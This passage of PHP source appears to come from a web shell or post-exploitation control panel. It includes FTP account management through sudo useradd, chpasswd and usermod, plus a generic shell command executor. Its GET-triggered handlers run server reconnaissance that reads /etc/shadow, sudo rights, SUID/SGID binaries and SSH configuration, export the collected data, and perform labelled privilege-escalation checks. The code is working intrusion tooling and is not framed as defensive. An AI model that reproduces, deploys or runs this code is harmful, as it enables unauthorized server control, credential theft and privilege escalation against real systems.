            'methods_available' => []
        ];

        // Method 1: Try to read vsftpd.userlist file
        $vsftpd_users = [];
        if ($this->fileExists($this->ftpUsersFile)) {
            $content = $this->readFile($this->ftpUsersFile);
            if (!empty($content)) {
                $vsftpd_users = array_filter(array_map('trim', explode("\n", $content)));
                $users = array_merge($users, $vsftpd_users);
                $capability_info['can_list'] = true;
                $capability_info['methods_available'][] = 'vsftpd.userlist file';
            }
            $sources_checked[] = $this->ftpUsersFile . ' (readable)';
        } else {
            $sources_checked[] = $this->ftpUsersFile . ' (not readable)';
        }

        // Method 2: Try system FTP users from /etc/passwd
        $etc_passwd_users = $this->getFtpUsersFromPasswd();
        if (!empty($etc_passwd_users)) {
            $users = array_merge($users, array_keys($etc_passwd_users));
            $capability_info['can_list'] = true;
            $capability_info['methods_available'][] = '/etc/passwd FTP users';
            $sources_checked[] = '/etc/passwd (FTP shell users detected)';
        }

        // Check if we can actually create users
        $can_manage = $this->checkUserManagementCapability();
        if ($can_manage) {
            $capability_info['can_create'] = true;
            $capability_info['can_delete'] = true;
            $capability_info['methods_available'][] = 'System user management (useradd/userdel)';
        } else {
            $capability_info['methods_available'][] = 'No write capability (read-only mode)';
        }

        // Remove duplicates
        $users = array_unique(array_filter($users));

        return [
            'users' => array_values($users),
            'count' => count($users),
            'message' => count($users) > 0 ? "Found " . count($users) . " FTP user(s)" : 'No FTP users found or unable to detect',
            'capability' => $capability_info,
            'sources_checked' => $sources_checked,
            'can_manage' => $can_manage
        ];
    }

    // Helper: Get FTP users from /etc/passwd (users with nologin/false shell)
    private function getFtpUsersFromPasswd() {
        $ftp_users = [];
        if (!$this->fileExists('/etc/passwd')) {
            return [];
        }

        $content = $this->readFile('/etc/passwd');
        if (empty($content)) {
            return [];
        }

        $lines = explode("\n", $content);
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line) || strpos($line, '#') === 0) continue;

            $parts = explode(':', $line);
            if (count($parts) < 7) continue;

            $username = $parts[0];
            $shell = isset($parts[6]) ? $parts[6] : '';

            // Check if user has FTP shell (nologin, false, or /bin/false)
            if (strpos($shell, 'nologin') !== false || strpos($shell, '/false') !== false || $shell === '/bin/false') {
                $ftp_users[$username] = $shell;
            }
        }

        return $ftp_users;
    }

    // Helper: Check if we can actually manage FTP users
    private function checkUserManagementCapability() {
        // Check if we can execute useradd/userdel (likely no in shared hosting)
        $test_cmd = safe_shell_exec('which useradd 2>/dev/null');
        if ($test_cmd && trim($test_cmd) !== '') {
            // useradd exists, check if we can execute it (will fail without sudo, but that's OK)
            $test_exec = safe_shell_exec('useradd --version 2>&1');
            if ($test_exec !== null) {
                return true; // Can likely execute user management
            }
        }

        // Check if we have write access to /etc/vsftpd.userlist
        if ($this->fileExists($this->ftpUsersFile) && is_writable($this->ftpUsersFile)) {
            return true; // Can write to userlist file
        }

        return false; // Cannot manage users
    }

    // Check privilege escalation and alternative methods
    public function checkPrivilegeEscalationOptions() {
        $options = [];

        // Check 1: sudo without password
        $sudo_test = safe_shell_exec('sudo -n id 2>&1');
        if ($sudo_test && strpos($sudo_test, 'uid=') !== false) {
            $options['sudo_no_password'] = true;
            $options['sudo_capabilities'] = trim($sudo_test);
        }

        // Check 2: SUID binaries that might help
        $suid_result = safe_shell_exec('find /usr -perm -4000 -name "*ftp*" -o -perm -4000 -name "*user*" 2>/dev/null | head -5');
        if ($suid_result && trim($suid_result) !== '') {
            $options['suid_binaries'] = explode("\n", trim($suid_result));
        }

        // Check 3: Current user groups
        $groups = safe_shell_exec('groups 2>/dev/null');
        if ($groups) {
            $options['current_groups'] = explode(' ', trim($groups));
        }

        // Check 4: File permissions on critical files
        $perms = [];
        $files = ['/etc/vsftpd.userlist', '/etc/vsftpd.conf', '/etc/shadow', '/etc/passwd'];
        foreach ($files as $file) {
            if (@file_exists($file)) {
                $rawPerms = @fileperms($file);
                $perms[$file] = [
                    'readable' => @is_readable($file),
                    'writable' => @is_writable($file),
                    'owner' => @fileowner($file) ?: 'unknown',
                    'perms' => ($rawPerms !== false) ? substr(sprintf('%o', $rawPerms), -4) : '----'
                ];
            }
        }
        $options['file_permissions'] = $perms;

        // Check 5: Virtual FTP users in database
        $db_test = safe_shell_exec('mysql -e "SELECT DATABASE();" 2>/dev/null');
        if ($db_test && trim($db_test) !== '') {
            $options['mysql_available'] = true;
        }

        // Check 6: Try to find FTP config alternative locations
        $alt_configs = safe_shell_exec('find ~/ -name "vsftpd*.conf" -o -name "*ftp*.conf" 2>/dev/null | head -5');
        if ($alt_configs && trim($alt_configs) !== '') {
            $options['alternative_configs'] = explode("\n", trim($alt_configs));
        }

        return $options;
    }

    // ============================================================================
    // NEW FTP MANAGEMENT FEATURES (Active Connections & SSL)
    // ============================================================================

    // 1. Get active FTP connections
    public function getActiveConnections() {
        $connections = [];

        // Method 1: Try netstat
        $netstat = safe_shell_exec('netstat -tnp 2>/dev/null | grep :21 | grep ESTABLISHED');
        if ($netstat) {
            $lines = explode("\n", trim($netstat));
            foreach ($lines as $line) {
                if (!empty(trim($line))) {
                    preg_match('/(\S+)\s+(\d+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)/', $line, $matches);
                    if (count($matches) > 6) {
                        $connections[] = [
                            'protocol' => $matches[1],
                            'remote_addr' => $matches[5],
                            'state' => $matches[6],
                            'pid' => $matches[7]
                        ];
                    }
                }
            }
        }

        // Method 2: Try lsof
        if (empty($connections)) {
            $lsof = safe_shell_exec('lsof -i :21 2>/dev/null | grep ESTABLISHED');
            if ($lsof) {
                $lines = explode("\n", trim($lsof));
                foreach ($lines as $line) {
                    if (!empty(trim($line))) {
                        $connections[] = ['raw' => $line];
                    }
                }
            }
        }

        return [
            'success' => true,
            'connections' => $connections,
            'count' => count($connections),
            'timestamp' => date('Y-m-d H:i:s')
        ];
    }

    // Get SSL/FTPS status
    public function getSSLStatus() {
        $config = $this->getConfig();
        return [
            'ssl_enabled' => isset($config['ssl_enable']) && $config['ssl_enable'] === true,
            'ssl_cert_file' => isset($config['rsa_cert_file']) ? $config['rsa_cert_file'] : 'Not configured',
            'ssl_key_file' => isset($config['rsa_private_key_file']) ? $config['rsa_private_key_file'] : 'Not configured',
            'tlsv1' => isset($config['ssl_tlsv1']) && $config['ssl_tlsv1'] === true,
            'tlsv1_2' => isset($config['ssl_tlsv1_2']) && $config['ssl_tlsv1_2'] === true
        ];
    }

    public function deleteUser($username) {
        if (empty($username)) {
            return ['success' => false, 'message' => 'Username is required'];
        }

        if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $username)) {
            return ['success' => false, 'message' => 'Invalid username format'];
        }

        // Check if user exists first
        $users = $this->listUsers();
        if (!in_array($username, $users['users'])) {
            return ['success' => false, 'message' => "User '$username' does not exist"];
        }

        // Try actual deletion
        $deleted = $this->attemptUserDeletion($username);
        if ($deleted['success']) {
            return $deleted;
        }

        return [
            'success' => false,
            'message' => 'Cannot delete FTP user on this system',
            'reason' => $deleted['reason'],
            'alternative' => 'Use your hosting control panel (cPanel, Plesk, etc.) or SSH access to delete FTP users'
        ];
    }

    // Helper: Try to delete user
    private function attemptUserDeletion($username) {
        // Method 1: Try to remove from vsftpd.userlist
        if ($this->fileExists($this->ftpUsersFile) && is_writable($this->ftpUsersFile)) {
            $content = @file_get_contents($this->ftpUsersFile) ?: '';
            $lines = explode("\n", $content);
            $new_lines = array_filter($lines, function($line) use ($username) {
                return trim($line) !== $username;
            });
            if (count($new_lines) < count($lines)) { // User was found and removed
                if (@file_put_contents($this->ftpUsersFile, implode("\n", $new_lines))) {
                    return [
                        'success' => true,
                        'message' => "FTP user '$username' deleted successfully"
                    ];
                }
            }
        }

        // Method 2: Try userdel command
        $userdel_cmd = safe_shell_exec("which userdel 2>/dev/null");
        if ($userdel_cmd !== null && trim($userdel_cmd) !== '') {
            $result = safe_shell_exec("sudo userdel -r " . escapeshellarg($username) . " 2>&1");
            if ($result !== null && strpos($result, 'error') === false) {
                return [
                    'success' => true,
                    'message' => "FTP user '$username' deleted successfully"
                ];
            }
        }

        return [
            'success' => false,
            'reason' => 'Shell execution disabled or insufficient permissions'
        ];
    }

    public function changePassword($username, $newPassword) {
        if (empty($username) || empty($newPassword)) {
            return ['success' => false, 'message' => 'Username and password are required'];
        }

        if (strlen($newPassword) < 6) {
            return ['success' => false, 'message' => 'Password must be at least 6 characters'];
        }

        // Check if user exists first
        $users = $this->listUsers();
        if (!in_array($username, $users['users'])) {
            return ['success' => false, 'message' => "User '$username' does not exist"];
        }

        // Try actual password change
        $changed = $this->attemptPasswordChange($username, $newPassword);
        if ($changed['success']) {
            return $changed;
        }

        return [
            'success' => false,
            'message' => 'Cannot change password on this system',
            'reason' => $changed['reason'],
            'alternative' => 'Use your hosting control panel (cPanel, Plesk, etc.) or SSH access to change FTP user passwords'
        ];
    }

    // Helper: Try to change password
    private function attemptPasswordChange($username, $newPassword) {
        // Method 1: Try chpasswd (portable across Debian/Ubuntu/RHEL)
        $chpasswd_cmd = safe_shell_exec("which chpasswd 2>/dev/null");
        if ($chpasswd_cmd !== null && trim($chpasswd_cmd) !== '') {
            $result = safe_shell_exec("echo " . escapeshellarg($username . ':' . $newPassword) . " | sudo chpasswd 2>&1");
            if ($result !== null && trim($result) === '') {
                return [
                    'success' => true,
                    'message' => "Password for '$username' changed successfully via chpasswd"
                ];
            }
        }

        // Method 2: Try passwd --stdin (RHEL/CentOS only)
        $passwd_cmd = safe_shell_exec("which passwd 2>/dev/null");
        if ($passwd_cmd !== null && trim($passwd_cmd) !== '') {
            $result = safe_shell_exec("echo " . escapeshellarg($newPassword) . " | sudo passwd --stdin " . escapeshellarg($username) . " 2>&1");
            if ($result !== null && stripos($result, 'error') === false && stripos($result, 'failed') === false) {
                return [
                    'success' => true,
                    'message' => "Password for '$username' changed successfully via passwd"
                ];
            }
        }

        return [
            'success' => false,
            'reason' => 'Shell execution disabled or insufficient permissions for password change'
        ];
    }

    public function enableUser($username) {
        if (empty($username)) {
            return ['success' => false, 'message' => 'Username is required'];
        }

        $result = safe_shell_exec("sudo usermod -s /bin/bash " . escapeshellarg($username) . " 2>&1");
        if ($result !== null && trim($result) === '') {
            return ['success' => true, 'message' => "FTP user '$username' enabled"];
        }
        return [
            'success' => false,
            'message' => "Cannot enable FTP user '$username': insufficient permissions",
            'alternative' => 'Use your hosting control panel or SSH to enable the FTP user'
        ];
    }

    public function disableUser($username) {
        if (empty($username)) {
            return ['success' => false, 'message' => 'Username is required'];
        }

        $result = safe_shell_exec("sudo usermod -s /usr/sbin/nologin " . escapeshellarg($username) . " 2>&1");
        if ($result !== null && trim($result) === '') {
            return ['success' => true, 'message' => "FTP user '$username' disabled"];
        }
        return [
            'success' => false,
            'message' => "Cannot disable FTP user '$username': insufficient permissions",
            'alternative' => 'Use your hosting control panel or SSH to disable the FTP user'
        ];
    }

    public function setUserDirectory($username, $directory) {
        if (empty($username) || empty($directory)) {
            return ['success' => false, 'message' => 'Username and directory are required'];
        }

        // Verify directory exists
        if (!@is_dir($directory)) {
            return ['success' => false, 'message' => "Directory does not exist: $directory"];
        }

        $result = safe_shell_exec("sudo usermod -d " . escapeshellarg($directory) . " " . escapeshellarg($username) . " 2>&1");
        if ($result !== null && trim($result) === '') {
            return ['success' => true, 'message' => "Home directory for '$username' set to '$directory'"];
        }
        return [
            'success' => false,
            'message' => "Cannot set home directory for '$username': insufficient permissions",
            'alternative' => 'Use your hosting control panel or SSH to change the FTP user home directory'
        ];
    }

    // Security Methods
    public function getSecuritySettings() {
        $config = $this->getConfig();

        // Extract security-relevant settings
        return [
            'anonymous_access' => isset($config['anonymous_enable']) ? $config['anonymous_enable'] : false,
            'ssl_enabled' => isset($config['ssl_enable']) ? $config['ssl_enable'] : false,
            'chroot_enabled' => isset($config['chroot_local_user']) ? $config['chroot_local_user'] : true,
            'write_enable' => isset($config['write_enable']) ? $config['write_enable'] : true,
            'delete_enable' => isset($config['delete_enable']) ? $config['delete_enable'] : true,
            'rename_enable' => isset($config['rename_enable']) ? $config['rename_enable'] : true,
            'chmod_enable' => isset($config['chmod_enable']) ? $config['chmod_enable'] : false,
            'max_clients' => intval(isset($config['max_clients']) ? $config['max_clients'] : 0),
            'max_per_ip' => intval(isset($config['max_per_ip']) ? $config['max_per_ip'] : 0),
            'idle_timeout' => intval(isset($config['idle_session_timeout']) ? $config['idle_session_timeout'] : 900)
        ];
    }

    public function backupConfiguration() {
        // Check if config file exists
        if (!$this->fileExists($this->ftpConfigFile)) {
            return [
                'success' => false,
                'message' => 'FTP configuration file not found'
            ];
        }

        $tmpDir = sys_get_temp_dir();
        $backupFile = tempnam($tmpDir, 'vsftpd_backup_');
        if ($backupFile === false) {
            return ['success' => false, 'message' => 'Cannot create temporary backup file'];
        }

        // Try to read and backup
        $configContent = $this->readFile($this->ftpConfigFile);
        if (!empty($configContent) && @file_put_contents($backupFile, $configContent)) {
            @chmod($backupFile, 0600);
            return [
                'success' => true,
                'message' => 'FTP configuration backed up successfully',
                'backupFile' => $backupFile,
                'timestamp' => date('Y-m-d H:i:s')
            ];
        }

        return [
            'success' => false,
            'message' => 'Failed to backup FTP configuration'
        ];
    }
}

// Timeout-protected shell execution with proper process management
function execute_command_with_timeout($cmd, $timeout = 30, $max_output = 10485760) {
    $start_time = microtime(true);
    $cmd = trim($cmd);

    if (empty($cmd)) {
        return [
            'success' => false,
            'output' => '',
            'error' => 'Error: Empty command',
            'timed_out' => false,
            'execution_time_ms' => 0,
            'warning' => null
        ];
    }

    // Try proc_open first for full timeout control
    if (is_function_available('proc_open')) {
        return execute_command_proc_open_with_timeout($cmd, $timeout, $max_output, $start_time);
    }

    // Fallback for older PHP or when proc_open is disabled
    return execute_command_fallback($cmd, $timeout, $max_output, $start_time);
}

// Execute command using proc_open with timeout and stream_select
function execute_command_proc_open_with_timeout($cmd, $timeout, $max_output, $start_time) {
    $output = '';
    $error = '';
    $timed_out = false;

    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w']
    ];

    $process = @proc_open($cmd, $descriptors, $pipes);

    if (!is_resource($process)) {
        return [
            'success' => false,
            'output' => '',
            'error' => 'Failed to open process with proc_open',
            'timed_out' => false,
            'execution_time_ms' => round((microtime(true) - $start_time) * 1000),
            'warning' => null
        ];
    }

    fclose($pipes[0]);
    stream_set_blocking($pipes[1], false);
    stream_set_blocking($pipes[2], false);

    $exit_code = null;

    try {
        while (true) {
            $elapsed = (microtime(true) - $start_time);
            $remaining_timeout = $timeout - $elapsed;

            if ($remaining_timeout <= 0) {
                $timed_out = true;
                break;
            }

            $status = proc_get_status($process);
            if (!$status['running']) {
                if ($exit_code === null) {
                    $exit_code = $status['exitcode'];
                }
                break;
            }

            $read_streams = [$pipes[1], $pipes[2]];
            $write_streams = null;
            $except_streams = null;

            $select_timeout_sec = (int)$remaining_timeout;
            $select_timeout_usec = (int)(($remaining_timeout - $select_timeout_sec) * 1000000);

            if ($select_timeout_sec == 0 && $select_timeout_usec == 0) {
                $select_timeout_usec = 100000;
            }

            $ready = @stream_select($read_streams, $write_streams, $except_streams, $select_timeout_sec, $select_timeout_usec);

            if ($ready === false) {
                usleep(50000);
                continue;
            }

            if (in_array($pipes[1], $read_streams)) {
                $chunk = fread($pipes[1], 8192);
                if ($chunk !== false && $chunk !== '') {
                    if (strlen($output) + strlen($chunk) > $max_output) {
                        $output .= substr($chunk, 0, $max_output - strlen($output));
                        break;
                    }
                    $output .= $chunk;
                }
            }

            if (in_array($pipes[2], $read_streams)) {
                $chunk = fread($pipes[2], 8192);
                if ($chunk !== false && $chunk !== '') {
                    if (strlen($error) + strlen($chunk) > $max_output) {
                        $error .= substr($chunk, 0, $max_output - strlen($error));
                        break;
                    }
                    $error .= $chunk;
                }
            }
        }

        if ($timed_out) {
            if (function_exists('proc_terminate')) {
                @proc_terminate($process, 15);
                usleep(2000000);
                $status = proc_get_status($process);
                if ($status['running']) {
                    @proc_terminate($process, 9);
                }
            }
        }

        $remaining_stdout = @stream_get_contents($pipes[1]);
        if ($remaining_stdout !== false && strlen($output) < $max_output) {
            $output .= substr($remaining_stdout, 0, $max_output - strlen($output));
        }

        $remaining_stderr = @stream_get_contents($pipes[2]);
        if ($remaining_stderr !== false && strlen($error) < $max_output) {
            $error .= substr($remaining_stderr, 0, $max_output - strlen($error));
        }

    } finally {
        @fclose($pipes[1]);
        @fclose($pipes[2]);
        @proc_close($process);
    }

    $return_code = ($exit_code !== null) ? $exit_code : -1;
    $execution_time_ms = round((microtime(true) - $start_time) * 1000);

    return [
        'success' => !$timed_out && $return_code === 0,
        'output' => $output,
        'error' => $error,
        'timed_out' => $timed_out,
        'execution_time_ms' => $execution_time_ms,
        'warning' => $timed_out ? 'Timeout reached after ' . $timeout . 's, showing partial results' : null
    ];
}

// Fallback command execution
function execute_command_fallback($cmd, $timeout, $max_output, $start_time) {
    if (is_function_available('shell_exec')) {
        $output = @shell_exec($cmd . " 2>&1");
        if ($output !== null && $output !== false) {
            if (strlen($output) > $max_output) {
                $output = substr($output, 0, $max_output);
            }
            $execution_time_ms = round((microtime(true) - $start_time) * 1000);
            return [
                'success' => true,
                'output' => $output,
                'error' => '',
                'timed_out' => false,
                'execution_time_ms' => $execution_time_ms,
                'warning' => 'Using shell_exec (no timeout protection available)'
            ];
        }
    }

    if (is_function_available('exec')) {
        $output_arr = [];
        $exec_result = @exec($cmd . " 2>&1", $output_arr, $return_code);
        if ($exec_result !== false) {
            $output = implode("\n", $output_arr);
            if (strlen($output) > $max_output) {
                $output = substr($output, 0, $max_output);
            }
            $execution_time_ms = round((microtime(true) - $start_time) * 1000);
            return [
                'success' => $return_code === 0,
                'output' => $output,
                'error' => '',
                'timed_out' => false,
                'execution_time_ms' => $execution_time_ms,
                'warning' => 'Using exec (no timeout protection available)'
            ];
        }
    }

    $execution_time_ms = round((microtime(true) - $start_time) * 1000);
    return [
        'success' => false,
        'output' => '',
        'error' => 'No suitable command execution method available',
        'timed_out' => false,
        'execution_time_ms' => $execution_time_ms,
        'warning' => null
    ];
}

// Start session untuk caching scan results
if (!headers_sent()) {
    @session_start();
}
if (isset($_GET['action']) && $_GET['action'] === 'perform_search') {
    header('Content-Type: text/html; charset=utf-8');
    $searchTerm = isset($_POST['search_term']) ? $_POST['search_term'] : '';
    $searchType = isset($_POST['search_type']) ? $_POST['search_type'] : 'filename';
    $searchFromRoot = isset($_POST['search_root']);
    $searchDir = isset($_POST['d']) ? $_POST['d'] : getcwd();
    if (empty($searchTerm)) {
        echo '<pre>Please enter a search term.</pre>';
        exit;
    }
    if ($searchFromRoot) {
        chdir('/');
    } else {
        chdir($searchDir);
    }
    $results = '';
    if ($searchType === 'filename') {
        $command = "find . -iname " . escapeshellarg("*$searchTerm*") . " 2>/dev/null";
        $results = execute_shell_command($command);
        if (empty(trim($results)) || strpos($results, 'Error:') === 0) {
            $results = "No files or directories found matching '" . htmlspecialchars($searchTerm) . "'";
        }
    } elseif ($searchType === 'content') {
        $command = "grep -Rin " . escapeshellarg($searchTerm) . " . 2>/dev/null";
        $results = execute_shell_command($command);
        if (empty(trim($results)) || strpos($results, 'Error:') === 0) {
            $results = "No files found containing the string '" . htmlspecialchars($searchTerm) . "'";
        }
    }
    echo "<pre>" . htmlspecialchars($results) . "</pre>";
    exit;
}
if (isset($_GET['action']) && $_GET['action'] === 'get_server_info') {
    header('Content-Type: text/html; charset=utf-8');
    echo get_detailed_server_info();
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'get_server_info_stream') {
    header('Content-Type: text/event-stream');
    header('Cache-Control: no-cache');
    header('Connection: keep-alive');
    header('X-Accel-Buffering: no');
    set_time_limit(120);

    $cache_key = 'server_info_cache_' . md5('all_sections');
    $use_cache = isset($_GET['use_cache']) && $_GET['use_cache'] === '1';

    $sections = [
        ['name' => '👤 CURRENT USER', 'cmd' => 'whoami && id', 'timeout' => 3, 'cacheable' => false],
        ['name' => '🖥️ KERNEL INFO', 'cmd' => 'uname -a 2>&1 | head -20', 'timeout' => 5, 'cacheable' => true],
        ['name' => '⚙️ SYSCTL VARS', 'cmd' => 'sysctl -a 2>/dev/null | head -20', 'timeout' => 5, 'cacheable' => true],
        ['name' => '📊 SUDO RIGHTS', 'cmd' => 'sudo -l 2>&1 | head -10', 'timeout' => 5, 'cacheable' => false],
        ['name' => '👥 PASSWD FILE', 'cmd' => 'cat /etc/passwd 2>/dev/null | head -15', 'timeout' => 3, 'cacheable' => true],
        ['name' => '👥 GROUP FILE', 'cmd' => 'cat /etc/group 2>/dev/null | head -15', 'timeout' => 3, 'cacheable' => true],
        ['name' => '🔐 SHADOW FILE', 'cmd' => 'cat /etc/shadow 2>/dev/null || echo "Cannot read /etc/shadow"', 'timeout' => 3, 'cacheable' => true],
        ['name' => '🌐 NETWORK INFO', 'cmd' => 'ip a 2>/dev/null || ifconfig 2>/dev/null || echo "No network info"', 'timeout' => 5, 'cacheable' => false],
        ['name' => '🔗 CONNECTIONS', 'cmd' => 'ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null || echo "No socket info"', 'timeout' => 5, 'cacheable' => false],
        ['name' => '📍 ARP TABLE', 'cmd' => 'arp -a 2>/dev/null || ip neigh 2>/dev/null || echo "No ARP info"', 'timeout' => 3, 'cacheable' => false],
        ['name' => '🛣️ ROUTING TABLE', 'cmd' => 'route -n 2>/dev/null || ip route 2>/dev/null || echo "No routing info"', 'timeout' => 3, 'cacheable' => false],
        ['name' => '⚡ PROCESSES', 'cmd' => 'ps aux 2>/dev/null | head -30', 'timeout' => 5, 'cacheable' => false],
        ['name' => '📈 TOP SNAPSHOT', 'cmd' => 'top -bn1 2>/dev/null | head -20', 'timeout' => 5, 'cacheable' => false],
        ['name' => '🔧 SERVICES', 'cmd' => 'systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -15 || echo "systemctl not found"', 'timeout' => 5, 'cacheable' => false],
        ['name' => '⏰ USER CRONTAB', 'cmd' => 'crontab -l 2>/dev/null || echo "No crontab for this user"', 'timeout' => 3, 'cacheable' => false],
        ['name' => '⏰ SYSTEM CRONS', 'cmd' => 'ls -la /etc/cron* /var/spool/cron 2>/dev/null | head -20', 'timeout' => 3, 'cacheable' => true],
        ['name' => '💾 DISK USAGE', 'cmd' => 'df -h 2>/dev/null', 'timeout' => 3, 'cacheable' => false],
        ['name' => '📁 MOUNTS', 'cmd' => 'mount 2>/dev/null', 'timeout' => 3, 'cacheable' => true],
        ['name' => '🔴 SUID FILES', 'cmd' => 'find /usr /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -20', 'timeout' => 5, 'cacheable' => true],
        ['name' => '📁 SGID FILES', 'cmd' => 'find /usr /bin /sbin /usr/bin /usr/sbin -perm -2000 -type f 2>/dev/null | head -20', 'timeout' => 5, 'cacheable' => true],
        ['name' => '✍️ WORLD-WRITABLE', 'cmd' => 'find /tmp /var/tmp -writable -type f 2>/dev/null | head -15', 'timeout' => 5, 'cacheable' => false],
        ['name' => '🐍 PHP CONFIG', 'cmd' => 'php -i 2>/dev/null | grep -E "(Configuration File|disable_functions|allow_url)" | head -10 || echo "PHP info unavailable"', 'timeout' => 5, 'cacheable' => true],
        ['name' => '📦 SOFTWARE', 'cmd' => 'python3 --version 2>&1; perl -v 2>/dev/null | head -2; ruby -v 2>&1; gcc --version 2>/dev/null | head -1; nginx -v 2>&1; apache2 -v 2>&1 || httpd -v 2>&1 | head -3', 'timeout' => 5, 'cacheable' => true],
        ['name' => '🏠 HOME DIRS', 'cmd' => 'ls -la /home/ 2>/dev/null', 'timeout' => 3, 'cacheable' => false],
        ['name' => '🔑 SSH CONFIG', 'cmd' => 'cat /etc/ssh/sshd_config 2>/dev/null | head -20', 'timeout' => 3, 'cacheable' => true],
    ];

    $total = count($sections);
    $all_data = [];

    foreach ($sections as $i => $section) {
        $progress = round(($i / $total) * 100);
        $section_cache_key = 'server_info_' . md5($section['name']);
        $cached_result = null;

        if ($use_cache && $section['cacheable'] && isset($_SESSION[$section_cache_key])) {
            $cached_data = $_SESSION[$section_cache_key];
            if (time() - $cached_data['timestamp'] < 1800) {
                $cached_result = $cached_data;
            }
        }

        if ($cached_result) {
            $output = $cached_result['content'];
            $timed_out = $cached_result['timed_out'];
            $from_cache = true;
        } else {
            $result = execute_command_with_timeout($section['cmd'], $section['timeout']);
            $output = $result['output'] ?: $result['error'];
            $timed_out = $result['timed_out'];
            $from_cache = false;

            if ($timed_out) {
                $output = "[TIMEOUT] Command took longer than {$section['timeout']} seconds - showing partial results:\n" . $output;
            }

            $output = htmlspecialchars($output ?: '(No output)', ENT_QUOTES, 'UTF-8');
            $output = substr($output, 0, 50000);

            if ($section['cacheable']) {
                $_SESSION[$section_cache_key] = [
                    'content' => $output,
                    'timed_out' => $timed_out,
                    'timestamp' => time()
                ];
            }
        }

        $section_data = [
            'section' => $section['name'],
            'content' => $output,
            'progress' => $progress,
            'timeout' => $timed_out,
            'index' => $i + 1,
            'total' => $total,
            'cached' => $from_cache
        ];

        $all_data[] = $section_data;

        echo "data: " . json_encode($section_data) . "\n\n";
        if (ob_get_level() > 0) { @ob_flush(); }
        flush();
    }

    $_SESSION['server_info_full_data'] = json_encode($all_data);

    echo "data: " . json_encode(['complete' => true, 'message' => 'Server info loaded successfully', 'cached' => $use_cache]) . "\n\n";
    exit;
}

if (isset($_GET['action']) && $_GET['action'] === 'export_server_info') {
    $format = isset($_GET['format']) ? $_GET['format'] : 'txt';
    $data_json = isset($_SESSION['server_info_full_data']) ? $_SESSION['server_info_full_data'] : '[]';
    $data = json_decode($data_json, true);
    if (!is_array($data)) { $data = []; }

    if ($format === 'json') {
        header('Content-Type: application/json');
        header('Content-Disposition: attachment; filename="server_info_' . date('Y-m-d_H-i-s') . '.json"');
        echo json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    } elseif ($format === 'csv') {
        header('Content-Type: text/csv; charset=utf-8');
        header('Content-Disposition: attachment; filename="server_info_' . date('Y-m-d_H-i-s') . '.csv"');
        echo "Section,Line,Content\n";
        foreach ($data as $section) {
            $lines = explode("\n", strip_tags(html_entity_decode($section['content'])));
            $line_num = 1;
            foreach ($lines as $line) {
                $line = trim($line);
                if (!empty($line)) {
                    $escaped = '"' . str_replace('"', '""', $line) . '"';
                    echo '"' . str_replace('"', '""', $section['section']) . '",' . $line_num . ',' . $escaped . "\n";
                    $line_num++;
                }
            }
        }
    } elseif ($format === 'html') {
        header('Content-Type: text/html; charset=utf-8');
        header('Content-Disposition: attachment; filename="server_info_' . date('Y-m-d_H-i-s') . '.html"');
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Server Info Export</title><style>body{font-family:monospace;background:#111;color:#0f0;padding:20px;margin:0}h1{color:#6cf;margin-top:0}h2{color:#0f0;margin-top:30px;border-bottom:1px solid #0f0;padding-bottom:5px}pre{background:#000;border:1px solid #0f0;padding:10px;overflow-x:auto;border-radius:3px}@media (max-width:768px){body{padding:10px}h2{margin-top:20px}pre{font-size:10.5px}}</style></head><body>';
        echo '<h1>🖥️ Server Information Export</h1>';
        echo '<p>Generated: ' . date('Y-m-d H:i:s') . '</p>';
        foreach ($data as $section) {
            echo '<h2>' . htmlspecialchars($section['section']) . '</h2>';
            echo '<pre>' . htmlspecialchars($section['content']) . '</pre>';
        }
        echo '</body></html>';
    } else {
        header('Content-Type: text/plain; charset=utf-8');
        header('Content-Disposition: attachment; filename="server_info_' . date('Y-m-d_H-i-s') . '.txt"');
        echo "═══════════════════════════════════════════════════════════\n";
        echo "SERVER INFORMATION EXPORT\n";
        echo "Generated: " . date('Y-m-d H:i:s') . "\n";
        echo "═══════════════════════════════════════════════════════════\n\n";
        foreach ($data as $section) {
            echo "\n" . str_repeat("─", 60) . "\n";
            echo $section['section'] . "\n";
            echo str_repeat("─", 60) . "\n";
            echo html_entity_decode(strip_tags($section['content'])) . "\n";
        }
    }
    exit;
}

// 🔥 MODULAR PRIVILEGE ESCALATION TOOLS - Action Handlers
if (isset($_GET['action']) && strpos($_GET['action'], 'privesc_') === 0) {
    header('Content-Type: application/json');

    switch($_GET['action']) {
        case 'privesc_suid':
            $output = execute_shell_command('find /usr /bin /sbin /usr/bin /usr/sbin -perm -4000 -type f 2>/dev/null | head -30');
            echo json_encode([
                'success' => !empty($output),
                'output' => $output ?: 'No SUID files found',
                'action' => 'SUID Files Detection'
            ]);
            break;

        case 'privesc_sudo':
            $sudoOutput = execute_shell_command('sudo -l 2>&1');
            $riskLevel = 'LOW';
            if (strpos($sudoOutput, 'NOPASSWD') !== false) {
                $riskLevel = 'CRITICAL';
            } elseif (strpos($sudoOutput, '*') !== false) {
                $riskLevel = 'HIGH';
            } elseif (strpos($sudoOutput, '(root)') !== false) {
                $riskLevel = 'HIGH';
            }

            echo json_encode([
                'success' => strpos($sudoOutput, 'User') === false && strpos($sudoOutput, 'not in sudoers') === false,
                'output' => $sudoOutput ?: 'User not in sudoers or sudo not accessible',
                'risk' => $riskLevel,
                'action' => 'Sudo Rights Analysis'
            ]);
            break;

        case 'privesc_cap':
            $output = execute_shell_command('getcap -r /usr/bin /usr/sbin /usr/local/bin 2>/dev/null | head -20');
            echo json_encode([
                'success' => !empty($output),
                'output' => $output ?: 'No binary capabilities detected',
                'action' => 'Linux Capabilities Scan'
            ]);
            break;

        case 'privesc_symlink':
            $output = execute_shell_command('find /tmp /var/tmp -type l 2>/dev/null | head -20');
            echo json_encode([
                'success' => !empty($output),
                'output' => $output ?: 'No suspicious symlinks found',
                'action' => 'Symlink Vulnerability Scan'
            ]);
            break;

        case 'privesc_perms':
